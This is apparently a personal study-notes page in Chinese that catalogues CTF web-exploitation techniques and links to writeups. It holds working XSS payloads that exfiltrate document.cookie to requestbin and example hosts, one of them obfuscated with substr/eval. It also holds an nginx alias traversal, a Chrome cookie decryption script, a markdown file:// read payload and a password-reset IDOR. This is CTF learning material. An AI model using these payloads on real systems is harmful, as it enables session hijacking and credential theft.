---
title: Web - 网络安全
date: 2025-03-31 18:32:09
categories: [CTF, 知识点]
tags: Web
---

# Web  Writeups



## 解题路径

查看开发者工具



### Server Side Template Injection (SSTI)

https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti



## javascript

从开发者工具里面



# Writeups

### 学习他人的writeup

https://mqcybersec.org/writeups/

https://github.com/hyungin0505/CTF-WriteUp/tree/main/2025

https://blog.csdn.net/CleverLee0/article/details/146080892?spm=1001.2014.3001.5502

https://blog.csdn.net/CleverLee0?type=blog

https://github.com/Haalloobim/CTF-Writeup-Notes/tree/main/ARA%20CTF%202023/Web%20Exploitation/Dewaweb

https://github.com/rerrorctf/writeups/blob/main/2024_11_10_BlueHens24/web/firefun_3/Writeup.md



## Information Collect

### Hidden Link(View Source)

* [head-dump](https://mqcybersec.org/writeups/picoctf-headdump/)

* [Scavenger Hunt](https://mqcybersec.org/writeups/picoctf-scavengerhunt/) `robots,.htaccess,.gitignore, .DS_Store` 
* [Insp3ct0r](https://mqcybersec.org/writeups/picoctf-insp3ct0r/)
* [secrets](https://mqcybersec.org/writeups/picoctf-secrets/)



### BurpSuite抓包

* [WebSockFish](https://mqcybersec.org/writeups/picoctf-websockfish/)
* [Cookies](https://mqcybersec.org/writeups/picoctf-cookies/) brute
* [Get aHead](https://mqcybersec.org/writeups/picoctf-getahead/) Head请求

* [Intro to Burp](https://mqcybersec.org/writeups/picoctf-introtoburp/) 修改包，不发送



### 控制台抓包

* [HTB Flag command](https://cr4zyp1x3l.netlify.app/htb-flag-command-writeup/)
* [find me](https://mqcybersec.org/writeups/picoctf-findme/)



## Brute Force

### Hash Cracking

* [Jawt scratchpad](https://mqcybersec.org/writeups/picoctf-jawtscratchpad/)



## Cookie

* [Cookie Monster Secret Recipe](https://mqcybersec.org/writeups/picoctf-cookiemonstersecretrecipe/)



### JWT

* [Jauth](https://mqcybersec.org/writeups/picoctf-jauth/)

## XSS

request bin: https://requestbin.whapi.cloud/

#### 漏洞

``` js
noMatchMessage.innerHTML = `No results for "${searchInput}".`;
```

#### javascript

* `trim()` 删除首尾空格
* `searchInput.split(/[^\p{L}]+/u)` 分隔unicode单词

#### 绕过

##### input

``` html
<input autofocus onfocusin=confirm()>
```

##### substr

``` html
<input onfocusin="eval('fetcha'.substr(0,5)+'(\''+'httpa'.substr(0,4)+'://exam'+'.pla'.substr(0,2)+'eex.'+'coma'.substr(0,3)+'/?yeet='+btoa(document.cookie)+'\')')" autofocus>
```

##### srcdoc

srcdoc 支持html endocing, 所以可以绕过

``` html
<iframe srcdoc="fetch('http://localhost:80/').finally(() => document.location="http://requestbin.whapi.cloud/1b7orwl1/?flag="+btoa(document.cookie));"></iframe>
```

最后写成链接的时候要url encoding，否则报错

* [**Hack the Bot 1 / PwnMe Quals 2025**](https://mqcybersec.org/writeups/25-pwnmequals-hackthebot1/)

* [HTB onlyhacks](https://cr4zyp1x3l.netlify.app/htb-onlyhacks-writeup/)



## Code Injection

* [caas](https://mqcybersec.org/writeups/picoctf-caas/)

### Python Code Execution

*  [3v@l](https://mqcybersec.org/writeups/picoctf-3vl/) 

## PHP文件上传

一句话木马：https://github.com/bayufedra/Tiny-PHP-Webshell

* [n0s4n1ty 1](https://mqcybersec.org/writeups/picoctf-n0s4n1ty1/)

* [Trickster](https://mqcybersec.org/writeups/picoctf-trickster/)



## SSTI

* [SSTI1 (without RCE..?)](https://mqcybersec.org/writeups/picoctf-ssti1/)

* [HTB-Spookifier](https://cr4zyp1x3l.netlify.app/htb-spookifier-writeup/)



### Side Channel Brute Force

* [**OTP / UTCTF 2025**](https://mqcybersec.org/writeups/25-utctf-otp/) 

### Nginx Shenanigans

nginx config的时候，`alias`出现错误

``` txt
location /logs {
    autoindex off;
    alias /tmp/bot_folder/logs/;
    try_files $uri $uri/ =404;
}
```

然后 `http://localhost/logs../browser_cache/Default/Cookies` 就是访问

`/tmp/bot_folder/logs/browser_cache/Default/Cookies` 就可以绕过了。

然后

``` shell
sqlite3 Cookies
select hex(encrypted_value) from cookies;
```

然后用下面的解密：

``` python
#! /usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Function to get rid of padding
def clean(x): 
    return x[:-x[-1]].decode('utf8')

encrypted_value = bytes.fromhex("763130AB3A186C367663FCBA25263072C8B5BFAF15135690D33686A9C6A4D0EA0403DE") 

encrypted_value = encrypted_value[3:]

# Default values used by both Chrome and Chromium in OSX and Linux
salt = b'saltysalt'
iv = b' ' * 16
length = 16

# On Mac, replace MY_PASS with your password from Keychain
# On Linux, replace MY_PASS with 'peanuts'
my_pass = "peanuts"
my_pass = my_pass.encode('utf8')

# 1003 on Mac, 1 on Linux
iterations = 1

key = PBKDF2(my_pass, salt, length, iterations)
cipher = AES.new(key, AES.MODE_CBC, IV=iv)

decrypted = cipher.decrypt(encrypted_value)
print(clean(decrypted))
```

* [**Hack the Bot 1 / PwnMe Quals 2025**](https://mqcybersec.org/writeups/25-pwnmequals-hackthebot1/) 

## HARD

### Race Condition

* [**Chat / UTCTF 2025**](https://mqcybersec.org/writeups/25-utctf-chat/)

### Chrome DevTools Protocol

CDP 是 Chrome 提供的调试协议，它使用 WebSocket 来通信，可以远程控制页面。这个协议的端口路径信息储存在 `DevToolsActivePort` 文件中。得到这个文件的内容后，可以

使用 CDP 的 `Target.createTarget` 来新建一个页面，比如：打开 `file:///root/flag2.txt`

用 `Target.attachToTarget` 附着到这个页面上

然后用 `Runtime.evaluate` 执行 JavaScript 来读取页面内容

* [**Hack the Bot 2 / PwnMe Quals 2025**](https://mqcybersec.org/writeups/25-pwnmequals-hackthebot2/)





## IDOR

### HTB Armaxis

> markdown, idor

这个网站的reset password会把token发送到email里面，但是这个token可以重置任意的email。我们从 `database.js` 里面得知管理员的账户是 `admin@armaxis.htb` , 于是我们用 `test@email.htb` 申请一个账户并且拿到重置密码的token，然后用hackbar发送一个reset-password的请求，可以在 `index.js` 里面看到这个，它会读取post的三个参数并且重置密码。这样我们重置了管理员账户的密码登录上去。

第二步是，disbute weapon里面会有个markdown，这个markdon可以读取本地的文件。因为 `markdown.js` 里面的 parse函数，会先把filecontent下载下来，然后用base64编码，于是我们构造payload是

``` md
![img](file:///flag.txt)
```

这样的图片，然后显示源代码拿到base64，解码得到flag

``` shell
HTB{m4rkd0wn_bugs_1n_th3_w1ld!}
```

## XSS

### HTB OnlyHacks 

> xss

这是一个很抽象的交友聊天网站，注册后登录进去。全点心心，然后会有人找你俩天。那个聊天框有XSS漏洞。再开发者工具里面查看cookie的httponly是没有勾选的。也就是说可以盗取对面的cookie. 于是先新建一个requestbin: https://requestbin.whapi.cloud/

然后发送

``` html
<script>document.location="http://requestbin.whapi.cloud/txg9l7tx/?flag="+document.cookie</script>
```

这样就把对面的cookie发送过来了. 然后在浏览器里面修改成对面的cookie，之后刷新页面。看到有个人发送了flag进来

``` shell
HTB{d0nt_trust_str4ng3r5_bl1ndly}
```



